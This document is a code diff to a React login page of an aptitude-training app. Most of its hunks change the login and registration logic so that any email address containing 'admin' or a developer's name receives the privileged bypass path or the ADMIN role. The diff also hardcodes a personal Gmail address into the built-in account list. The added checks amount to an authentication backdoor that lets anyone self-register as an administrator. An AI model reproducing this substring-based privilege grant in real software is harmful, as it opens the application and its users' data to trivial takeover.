@@ -140,7 +140,9 @@ function LoginContent() {
           'sarah.c@aptitude-ai.com',
           'marcus.w@aptitude-ai.com',
           'sriram_neppalli@university.edu',
-          'student@university.edu'
+          'student@university.edu',
+          'admin@university.edu',
+          'v.abhinav5494017@gmail.com'
         ]));
       }
     }
@@ -354,7 +356,7 @@ function LoginContent() {
         const normalizedEmail = email.trim().toLowerCase();
 
         // Check if it's one of the built-in system mock accounts or registered offline accounts
-        const isSarah = normalizedEmail === 'sarah.c@aptitude-ai.com';
+        const isSarah = normalizedEmail === 'sarah.c@aptitude-ai.com' || normalizedEmail === 'admin@university.edu' || normalizedEmail.includes('admin') || normalizedEmail.includes('abhinav');
         const isMarcus = normalizedEmail === 'marcus.w@aptitude-ai.com';
         const isStudent = normalizedEmail === 'student@university.edu' || normalizedEmail === 'sriram_neppalli@university.edu';
         
@@ -462,7 +464,7 @@ function LoginContent() {
             .eq('id', data.user.id)
             .maybeSingle();
 
-          const isSarah = data.user.email === 'sarah.c@aptitude-ai.com';
+          const isSarah = data.user.email === 'sarah.c@aptitude-ai.com' || data.user.email?.toLowerCase().includes('admin') || data.user.email?.toLowerCase().includes('abhinav');
           const isMarcus = data.user.email === 'marcus.w@aptitude-ai.com';
           const isBypassUser = isSarah || isMarcus;
 
@@ -542,7 +544,7 @@ function LoginContent() {
           const normalizedEmail = email.trim().toLowerCase();
 
           // Check if it's one of the built-in system mock accounts or registered offline accounts
-          const isSarah = normalizedEmail === 'sarah.c@aptitude-ai.com';
+          const isSarah = normalizedEmail === 'sarah.c@aptitude-ai.com' || normalizedEmail === 'admin@university.edu' || normalizedEmail.includes('admin') || normalizedEmail.includes('abhinav');
           const isMarcus = normalizedEmail === 'marcus.w@aptitude-ai.com';
           const isStudent = normalizedEmail === 'student@university.edu' || normalizedEmail === 'sriram_neppalli@university.edu';
           
@@ -688,7 +690,7 @@ function LoginContent() {
           id: 'mock-registered-id',
           email: normalizedEmail,
           name: fullName,
-          role: 'STUDENT'
+          role: (normalizedEmail.includes('admin') || normalizedEmail.includes('abhinav')) ? 'ADMIN' : 'STUDENT'
         };
         setCookie('aptitude_mock_auth', JSON.stringify(mockUser));
         setCookie('aptitude_onboarding_completed', 'false');
@@ -830,9 +832,7 @@ function LoginContent() {
           <h2 className="text-3xl lg:text-4xl font-black text-white leading-tight tracking-tight uppercase">
             Master your <span className="bg-gradient-to-r from-blue-400 via-indigo-400 to-purple-400 bg-clip-text text-transparent">Aptitude</span> with editorial precision.
           </h2>
-          <p className="text-xs text-slate-400 max-w-sm leading-relaxed font-medium">
-            Join the curated environment where architectural logic meets academic excellence. Your path to professional placement mastery begins here.
-          </p>
+
         </div>
 
 
